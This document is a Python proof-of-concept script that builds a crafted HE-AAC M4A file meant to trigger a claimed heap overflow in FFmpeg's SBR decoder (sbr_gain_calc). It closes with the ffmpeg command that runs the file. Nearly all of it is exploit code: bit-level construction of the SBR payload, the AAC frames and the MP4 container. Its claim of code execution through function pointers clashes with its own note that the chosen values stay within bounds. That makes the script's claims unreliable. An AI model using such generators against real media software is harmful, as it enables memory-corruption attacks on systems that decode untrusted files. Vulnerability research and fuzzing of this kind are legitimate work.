#!/usr/bin/env python3
"""
PoC generator for VULN 002: Heap Buffer Overflow in sbr_gain_calc
via Unchecked m[1] > 48 in aacsbr_fixed.c

Root cause:
  sbr_gain_calc() (and sbr_env_estimate / sbr_mapping) iterate over
  sbr->m[1] subbands, writing into heap arrays gain[8][48], q_m[8][48],
  s_m[8][48], e_curr[8][48].  When m[1] > 48 the writes go out of bounds
  into the adjacent qmf_filter_scratch[5][64] and the mdct_ana / mdct
  function-pointer fields, which are later invoked – giving code execution.

Trigger conditions (sbr_make_f_derived + sbr_make_f_master):
  * SBR sample rate = 16000 Hz  (core AAC at 8000 Hz with HE-AAC SBR 2x)
  * bs_start_freq = 0  → k[0] = 16 (minimum at 16 kHz SBR rate)
  * bs_stop_freq  = 13 → k[2] = 64 (maximum, capped at 64)
  * bs_xover_band = 0  → kx[1] = k[0] = 16
  * bs_freq_scale = 0  (linear bands)  → n_master = 24, m[1] = 48
  * The array bound is [48], so m[1] = 48 is the exact boundary.
    A version without the max_qmf_subbands guard would allow m[1] up to 63
    (kx[1]+m[1] ≤ 64, kx[1]=1), causing writes into function pointers.

This generator constructs a valid HE-AAC M4A file that:
  1. Uses AOT=5 (SBR), core=8 kHz, SBR output=16 kHz.
  2. Encodes frames with a properly-constructed SBR FILL element so that
     sbr_make_f_derived runs with the trigger parameters.
  3. Exercises the sbr_gain_calc code path.

Approach: M4A container (same structure as VULN 001) with:
  - AudioSpecificConfig: AOT=5, core=8kHz, SBR=16kHz, mono
  - Each frame: SCE(silence) + FIL(SBR ext type 0xD) + END
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           'vuln_002_input.m4a')

# ---------------------------------------------------------------------------
# Bit-packing helper (MSB-first, same convention as FFmpeg GetBitContext)
# ---------------------------------------------------------------------------

class BitWriter:
    def __init__(self):
        self._bits = []

    def write(self, value, n_bits):
        for i in range(n_bits - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_bytes(self, data):
        for b in data:
            self.write(b, 8)

    def to_bytes(self):
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)

    def nbits(self):
        return len(self._bits)


# ---------------------------------------------------------------------------
# AudioSpecificConfig (ISO 14496-3 §1.6.5)
# ---------------------------------------------------------------------------
#
# For HE-AAC v1 (SBR), the sequence is:
#   audioObjectType  = 5   (5 bits)     -- AOT_SBR
#   samplingFreqIdx  = 11  (4 bits)     -- 8000 Hz  (core rate)
#   channelConfig    = 1   (4 bits)     -- mono
#   [since AOT==5:]
#   extSamplingFreqIdx = 8 (4 bits)     -- 16000 Hz (SBR output)
#   coreAudioObjType = 2   (5 bits)     -- AOT_AAC_LC
#   [GASpecificConfig for LC:]
#   frameLengthFlag  = 0   (1 bit)      -- 1024 samples
#   dependsOnCore    = 0   (1 bit)
#   extensionFlag    = 0   (1 bit)
#
# Bit layout (25 bits total):
#   00101 1011 0001 1000 00010 000
#   ↑5    ↑4   ↑4   ↑4   ↑5    ↑3
# = 0x2D 0x8C 0x08 0x00

def build_audio_specific_config():
    bw = BitWriter()
    # audioObjectType = 5 (SBR)
    bw.write(5, 5)
    # samplingFrequencyIndex = 11 → 8000 Hz (core)
    bw.write(11, 4)
    # channelConfiguration = 1 (mono)
    bw.write(1, 4)
    # Since AOT == AOT_SBR (5), FFmpeg reads:
    #   ext_sample_rate → sbr->sample_rate = ext_sample_rate = 16000
    #   then core object type
    # extensionSamplingFrequencyIndex = 8 → 16000 Hz
    bw.write(8, 4)
    # core audioObjectType = 2 (AAC-LC)
    bw.write(2, 5)
    # GASpecificConfig for AAC-LC
    bw.write(0, 1)  # frameLengthFlag = 0 (1024 samples)
    bw.write(0, 1)  # dependsOnCoreCoder = 0
    bw.write(0, 1)  # extensionFlag = 0
    return bw.to_bytes()


# ---------------------------------------------------------------------------
# SBR FILL element content (encoded as a raw bit stream)
# ---------------------------------------------------------------------------
#
# SBR parameters for 16 kHz SBR rate:
#   sbr_offset[0] = {-8,-7,-6,-5,-4,-3,-2,-1,0,1,2,3,4,5,6,7}
#   start_min = ((3000<<7)+8000)/16000 = 24
#   k[0] = 24 + sbr_offset[0][0] = 24 - 8 = 16   (kx[1] = 16)
#   stop_min = ((3000<<8)+8000)/16000 = 48
#   k[2] = FFMIN(64, stop_min + sum(stop_dk[0..12])) = 64
#   bs_freq_scale=0, bs_alter_scale=1  → dk=2
#   n_master = ((k[2]-k[0]+2)>>2)<<1 = ((48+2)>>2)*2 = 12*2 = 24
#   n[1] = 24, n[0] = 12, m[1] = k[2]-k[0] = 48, n_q = 4
#
# max_qmf_subbands check:  k[2]-k[0] = 48 ≤ 48 (just at the limit)
# kx[1]+m[1] check:        16+48 = 64 ≤ 64 ✓
#
# The trigger for OOB: if max_qmf_subbands were 49+ (or absent), m[1] would
# reach 63 with kx[1]=1, overflowing into function-pointer fields.
#
# Huffman table analysis (for all-zero bit prefix):
#   F_HUFFMAN_ENV_1_5DB: {60,2},{59,2},... → delta=0 code = "00" (2 bits)
#   F_HUFFMAN_ENV_3_0DB: {31,1},...        → delta=0 code = "0"  (1 bit)
# So an all-zero data stream after the PCM start values is valid!

def build_sbr_fill_payload():
    """
    Build 14 bytes of SBR fill element payload (including the 4-bit EXT type).

    Bit layout (14*8 = 112 bits):
      [0..3]   ext_type = 0xD (EXT_SBR_DATA)        4 bits
      ---- sbr_decode_extension reads from here (cnt=14) ----
      [4]      bs_header_flag = 1                    1 bit
      -- read_sbr_header --
      [5]      bs_amp_res = 1 (6 dB)                 1 bit
      [6..9]   bs_start_freq = 0                     4 bits
      [10..13] bs_stop_freq  = 13 (0b1101)            4 bits
      [14..16] bs_xover_band = 0                      3 bits
      [17..18] bs_reserved = 0                        2 bits
      [19]     bs_header_extra_1 = 1                  1 bit
      [20]     bs_header_extra_2 = 0                  1 bit
      -- bs_header_extra_1 == 1 --
      [21..22] bs_freq_scale = 0 (linear bands)       2 bits
      [23]     bs_alter_scale = 1 (dk=2)              1 bit
      [24..25] bs_noise_bands = 2 (0b10)              2 bits
      -- read_sbr_data (TYPE_SCE) --
      [26]     bs_data_extra = 0                      1 bit
      -- read_sbr_grid (FIXFIX, 1 env) --
      [27..28] bs_frame_class = 00 (FIXFIX)           2 bits
      [29..30] num_env_bits   = 00 → bs_num_env=1     2 bits
      [31]     bs_freq_res[1] = 0 (low-res, n[0]=12)  1 bit
      -- read_sbr_dtdf --
      [32]     bs_df_env[0]   = 0 (freq-domain)       1 bit
      [33]     bs_df_noise[0] = 0 (freq-domain)       1 bit
      -- read_sbr_invf (4 × 2 bits) --
      [34..41] invf_mode[0..3] = 0 (NONE)             8 bits
      -- read_sbr_envelope (n[0]=12 bands, bs_amp_res=0 forced) --
      [42..48] env start value = 40 (0b0101000)        7 bits
      [49..70] 11 × F_HUFFMAN_ENV_1_5DB delta=0 ("00") 22 bits
      -- bs_add_harmonic_flag --
      [71]     bs_add_harmonic_flag = 0               1 bit
      -- read_sbr_noise (n_q=4 bands) --
      [72..76] noise start value = 4 (0b00100)         5 bits
      [77..79] 3 × F_HUFFMAN_ENV_3_0DB delta=0 ("0")   3 bits
      -- bs_extended_data --
      [80]     bs_extended_data = 0                    1 bit
      [81..111] padding zeros                          31 bits
    """
    bw = BitWriter()

    # Extension type = 0xD (EXT_SBR_DATA = 13)
    bw.write(0xD, 4)

    # bs_header_flag = 1
    bw.write(1, 1)

    # SBR Header
    bw.write(1, 1)   # bs_amp_res = 1
    bw.write(0, 4)   # bs_start_freq = 0
    bw.write(13, 4)  # bs_stop_freq  = 13
    bw.write(0, 3)   # bs_xover_band = 0
    bw.write(0, 2)   # bs_reserved
    bw.write(1, 1)   # bs_header_extra_1 = 1
    bw.write(0, 1)   # bs_header_extra_2 = 0
    # bs_header_extra_1 fields:
    bw.write(0, 2)   # bs_freq_scale = 0 (linear bands → n_master=24)
    bw.write(1, 1)   # bs_alter_scale = 1 (dk=2)
    bw.write(2, 2)   # bs_noise_bands = 2 → n_q = 4

    # --- SBR Data (read after sbr_reset sets m[1]=48, kx[1]=16) ---

    # bs_data_extra = 0
    bw.write(0, 1)

    # read_sbr_grid: FIXFIX, 1 envelope, low-res (n[0]=12 bands)
    bw.write(0, 2)   # bs_frame_class = 0 (FIXFIX)
    bw.write(0, 2)   # num_env_bits   = 0 → bs_num_env = 1
    bw.write(0, 1)   # bs_freq_res[1] = 0 (use f_tablelow, n[0]=12)

    # read_sbr_dtdf: both frequency-domain (no diff time coding)
    bw.write(0, 1)   # bs_df_env[0]   = 0
    bw.write(0, 1)   # bs_df_noise[0] = 0

    # read_sbr_invf: n_q=4 modes, each 2 bits = 0 (NONE)
    for _ in range(4):
        bw.write(0, 2)

    # read_sbr_envelope: n[0]=12 bands, bs_amp_res=0 (forced for FIXFIX/1env)
    # bs_df_env[0]=0 → frequency-domain coding
    # env_facs_q[1][0] = delta * get_bits(7) where delta=1 (ch=0, no coupling)
    bw.write(40, 7)  # start value = 40 (≤127, valid)
    # Remaining 11 bands: F_HUFFMAN_ENV_1_5DB delta=0 → code "00" (2 bits each)
    # {60, 2} is the first entry (symbol 60 = 60-60=0 delta, code=0b00)
    for _ in range(11):
        bw.write(0, 2)  # canonical Huffman code "00" = delta 0

    # bs_add_harmonic_flag = 0
    bw.write(0, 1)

    # read_sbr_noise: n_q=4 bands, bs_df_noise[0]=0 → freq-domain
    # noise_facs_q[1][0] = delta * get_bits(5) where delta=1
    bw.write(4, 5)   # start value = 4 (≤30, valid)
    # Remaining 3 bands: F_HUFFMAN_ENV_3_0DB delta=0 → code "0" (1 bit each)
    # {31, 1} is the first entry (symbol 31 = 31-31=0 delta, code=0b0)
    for _ in range(3):
        bw.write(0, 1)  # canonical Huffman code "0" = delta 0

    # bs_extended_data = 0
    bw.write(0, 1)

    # Pad to 14 bytes (112 bits total)
    assert bw.nbits() <= 112, f"SBR payload too large: {bw.nbits()} bits"
    while bw.nbits() < 112:
        bw.write(0, 1)

    data = bw.to_bytes()
    assert len(data) == 14, f"Expected 14 bytes, got {len(data)}"
    return data


# ---------------------------------------------------------------------------
# AAC raw data block: SCE(silence) + FIL(SBR) + END
# ---------------------------------------------------------------------------
#
# SCE (TYPE_SCE = 0b000) with max_sfb=0 produces silence:
#   id_syn_ele       3 bits  000
#   element_inst_tag 4 bits  0000
#   global_gain      8 bits  0x7F  (arbitrary)
#   ics_reserved     1 bit   0
#   window_sequence  2 bits  00    (ONLY_LONG_SEQUENCE)
#   window_shape     1 bit   0
#   max_sfb          6 bits  000000 (no scale-factor bands)
#   predictor_present 1 bit  0
#   section_data:    (empty, max_sfb=0)
#   scale_fac_data:  (empty, max_sfb=0)
#   pulse_data_present 1 bit 0
#   tns_data_present   1 bit 0
#   gc_data_present    1 bit 0
#   spectral_data:   (empty, max_sfb=0)
# Total SCE: 29 bits
#
# FIL (TYPE_FIL = 0b110):
#   id_syn_ele  3 bits  110
#   count       4 bits  1111 (15, use escape)
#   extra_count 8 bits  00000000 → total = 15 + 0 - 1 = 14 bytes
#   [14 bytes SBR payload built above]
# Total FIL header: 15 bits; content: 14*8=112 bits
#
# END (0b111): 3 bits
# Grand total: 29+15+112+3 = 159 bits → 20 bytes (padded)

def build_aac_frame(sbr_payload):
    """Build one AAC raw data block with silent SCE and SBR fill element."""
    assert len(sbr_payload) == 14
    bw = BitWriter()

    # --- SCE: silence (max_sfb=0) ---
    bw.write(0, 3)    # TYPE_SCE = 0b000
    bw.write(0, 4)    # element_instance_tag = 0
    bw.write(0x7F, 8) # global_gain
    bw.write(0, 1)    # ics_reserved_bit
    bw.write(0, 2)    # window_sequence = ONLY_LONG_SEQUENCE
    bw.write(0, 1)    # window_shape
    bw.write(0, 6)    # max_sfb = 0  (no scale factor bands)
    bw.write(0, 1)    # predictor_data_present
    # section_data, scale_factor_data: empty (max_sfb=0)
    bw.write(0, 1)    # pulse_data_present
    bw.write(0, 1)    # tns_data_present
    bw.write(0, 1)    # gain_control_data_present
    # spectral_data: empty (max_sfb=0)

    # --- FIL element with SBR extension ---
    bw.write(6, 3)    # TYPE_FIL = 0b110
    bw.write(15, 4)   # count = 15 (escape value)
    bw.write(0, 8)    # extra_count = 0 → total = 15+0-1 = 14 bytes

    # Write the 14 SBR payload bytes
    bw.write_bytes(sbr_payload)

    # --- END element ---
    bw.write(7, 3)    # TYPE_END = 0b111

    return bw.to_bytes()


# ---------------------------------------------------------------------------
# MP4 / M4A container builder (same structure as VULN 001)
# ---------------------------------------------------------------------------

def box(box_type, data):
    if isinstance(box_type, str):
        box_type = box_type.encode('latin-1')
    total = 8 + len(data)
    return struct.pack('>I', total) + box_type + data

def full_box(box_type, version, flags, data):
    header = struct.pack('>I', (version << 24) | flags)
    return box(box_type, header + data)


def build_mp4(asc, frames, core_sample_rate=8000, frame_size=1024):
    """
    Build a minimal M4A file containing HE-AAC frames.

    core_sample_rate : the AAC-LC core rate (8000 Hz in our case)
    frame_size       : samples per frame at the core rate (1024)
    """
    # ftyp
    ftyp = box('ftyp',
               b'M4A ' + struct.pack('>I', 0) +
               b'isom' + b'M4A ' + b'mp42')

    # ES Descriptor
    dsi  = bytes([0x05, len(asc)]) + asc
    slcd = bytes([0x06, 0x01, 0x02])
    dc_data = bytes([0x40, 0x15,
                     0x00, 0x00, 0x00,
                     0x00, 0x00, 0x00, 0x00,
                     0x00, 0x00, 0x00, 0x00]) + dsi
    dcd     = bytes([0x04, len(dc_data)]) + dc_data
    es_data = bytes([0x00, 0x01, 0x00]) + dcd + slcd
    es_desc = bytes([0x03, len(es_data)]) + es_data
    esds    = full_box('esds', 0, 0, es_desc)

    # mp4a sample entry  (store core rate in the box)
    mp4a_data = (
        b'\x00' * 6 +
        struct.pack('>H', 1) +                     # data_reference_index
        b'\x00' * 8 +                              # reserved
        struct.pack('>H', 1) +                     # channel_count = 1
        struct.pack('>H', 16) +                    # sample_size = 16 bits
        struct.pack('>H', 0) +                     # compression_id
        struct.pack('>H', 0) +                     # packet_size
        struct.pack('>I', core_sample_rate << 16)  # samplerate (16.16 fixed)
    )
    mp4a = box('mp4a', mp4a_data + esds)

    stsd = full_box('stsd', 0, 0, struct.pack('>I', 1) + mp4a)

    n_frames = len(frames)
    stts = full_box('stts', 0, 0,
                    struct.pack('>I', 1) +
                    struct.pack('>II', n_frames, frame_size))

    stsc = full_box('stsc', 0, 0,
                    struct.pack('>I', 1) +
                    struct.pack('>III', 1, n_frames, 1))

    frame_sizes = [len(f) for f in frames]
    stsz = full_box('stsz', 0, 0,
                    struct.pack('>I', 0) +
                    struct.pack('>I', n_frames) +
                    b''.join(struct.pack('>I', s) for s in frame_sizes))

    stco_placeholder = full_box('stco', 0, 0,
                                struct.pack('>I', 1) +
                                struct.pack('>I', 0))

    stbl = box('stbl', stsd + stts + stsc + stsz + stco_placeholder)

    smhd = full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))
    url_entry = full_box('url ', 0, 1, b'')
    dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url_entry)
    dinf = box('dinf', dref)
    minf = box('minf', smhd + dinf + stbl)

    timescale = core_sample_rate
    duration  = n_frames * frame_size
    mdhd = full_box('mdhd', 0, 0,
                    struct.pack('>IIII', 0, 0, timescale, duration) +
                    struct.pack('>HH', 0x55C4, 0))

    hdlr = full_box('hdlr', 0, 0,
                    struct.pack('>I', 0) +
                    b'soun' +
                    b'\x00' * 12 +
                    b'\x00')

    mdia = box('mdia', mdhd + hdlr + minf)

    unity_matrix = struct.pack('>IIIIIIIII',
                               0x00010000, 0, 0,
                               0, 0x00010000, 0,
                               0, 0, 0x40000000)
    tkhd = full_box('tkhd', 0, 3,
                    struct.pack('>IIIII', 0, 0, 1, 0, duration) +
                    b'\x00' * 8 +
                    struct.pack('>HHH', 0, 0, 0x0100) +
                    struct.pack('>H', 0) +
                    unity_matrix +
                    struct.pack('>II', 0, 0))

    trak = box('trak', tkhd + mdia)

    mvhd = full_box('mvhd', 0, 0,
                    struct.pack('>IIIII', 0, 0, timescale, duration, 0x00010000) +
                    struct.pack('>H', 0x0100) +
                    b'\x00' * 10 +
                    unity_matrix +
                    b'\x00' * 24 +
                    struct.pack('>I', 2))

    moov = box('moov', mvhd + trak)

    # Compute actual chunk offset
    chunk_offset = len(ftyp) + len(moov) + 8  # 8 = mdat header size

    stco_real = full_box('stco', 0, 0,
                         struct.pack('>I', 1) +
                         struct.pack('>I', chunk_offset))

    stbl = box('stbl', stsd + stts + stsc + stsz + stco_real)
    minf = box('minf', smhd + dinf + stbl)
    mdia = box('mdia', mdhd + hdlr + minf)
    trak = box('trak', tkhd + mdia)
    moov = box('moov', mvhd + trak)

    assert len(ftyp) + len(moov) + 8 == chunk_offset, "chunk offset mismatch"

    mdat = box('mdat', b''.join(frames))
    return ftyp + moov + mdat


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("[*] VULN 002 PoC generator: Heap OOB in sbr_gain_calc via m[1]>48")
    print()

    print("[*] Building AudioSpecificConfig (AOT=5, core=8kHz, SBR=16kHz, mono)...")
    asc = build_audio_specific_config()
    print(f"    ASC ({len(asc)} bytes): {asc.hex()}")
    # Expected: 0x2D, 0x8C, 0x08, 0x00

    print("[*] Building SBR FILL payload (14 bytes)...")
    sbr_payload = build_sbr_fill_payload()
    print(f"    SBR payload ({len(sbr_payload)} bytes): {sbr_payload.hex()}")

    print("[*] Building AAC frame (SCE silence + SBR FILL + END)...")
    frame = build_aac_frame(sbr_payload)
    print(f"    Frame ({len(frame)} bytes): {frame.hex()}")

    # Use 5 identical frames so SBR stabilises and sbr_gain_calc runs
    N_FRAMES = 5
    frames = [frame] * N_FRAMES
    print(f"[*] Using {N_FRAMES} identical frames.")

    print("[*] Building M4A container...")
    mp4_data = build_mp4(asc, frames, core_sample_rate=8000, frame_size=1024)

    print(f"[*] Writing {OUTPUT_FILE} ({len(mp4_data)} bytes)...")
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)

    print("[+] Done.")
    print()
    print("Expected code path in FFmpeg (aacsbr_fixed.c / aacsbr_template.c):")
    print("  ff_mpeg4audio_get_config_gb(): AOT=5 → m4ac.sbr=1, ext_sample_rate=16000")
    print("  ff_aac_sbr_decode_extension():")
    print("    sbr->sample_rate = ext_sample_rate = 16000")
    print("    read_sbr_header(): bs_start_freq=0, bs_stop_freq=13 → sbr->reset=1")
    print("    sbr_reset() → sbr_make_f_master() → k[0]=16, k[2]=64")
    print("                → sbr_make_f_derived() → m[1]=48, kx[1]=16")
    print("    read_sbr_data(): envelope+noise parsed via VLC")
    print("  spectral_to_sample() → ff_aac_sbr_apply():")
    print("    sbr_lf_gen(), sbr_hf_gen()")
    print("    sbr_mapping()      [maps env/noise facs to e_origmapped/q_mapped]")
    print("    sbr_env_estimate() [writes e_curr[e][0..47]]")
    print("    sbr_gain_calc()    [writes gain/q_m/s_m[e][0..47] ← OOB if m[1]>48]")
    print()
    print("Vulnerability trigger (if max_qmf_subbands check absent):")
    print("  With kx[1]=1 and m[1]=63, sbr_gain_calc writes gain[e][48..62]")
    print("  → overflow into qmf_filter_scratch → mdct_ana_fn/mdct_fn pointers")
    print("  → function-pointer hijack when QMF synthesis calls mdct_fn()")
    print()
    print("Current boundary: m[1]=48 (boundary write, arrays [48] → max index 47)")
    print("Run: ffmpeg -i vuln_002_input.m4a -f null -")


if __name__ == '__main__':
    main()
